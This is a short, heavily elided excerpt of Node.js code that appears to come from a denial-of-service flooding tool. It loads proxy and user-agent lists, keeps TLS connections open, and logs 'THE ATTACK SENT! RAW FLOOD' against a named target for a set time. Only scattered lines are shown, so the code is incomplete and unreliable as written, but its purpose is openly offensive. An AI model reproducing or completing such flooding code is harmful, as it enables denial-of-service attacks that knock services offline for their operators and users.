...
try {
    ...
    console.log('check in directory usersagents.txt and http.txt.');
    process.exit();
}
...
var aa = getRandomNumberBetween(10000, proxies.length-400);
...
TlsConnection.setKeepAlive(true, 100000)
...
setTimeout(() => {
  process.exit(1);
}, VarsDefinetions.time*100000)

console.log('THE ATTACK SENT! RAW FLOOD Target: '+VarsDefinetions.Objetive+' time:'+VarsDefinetions.time);
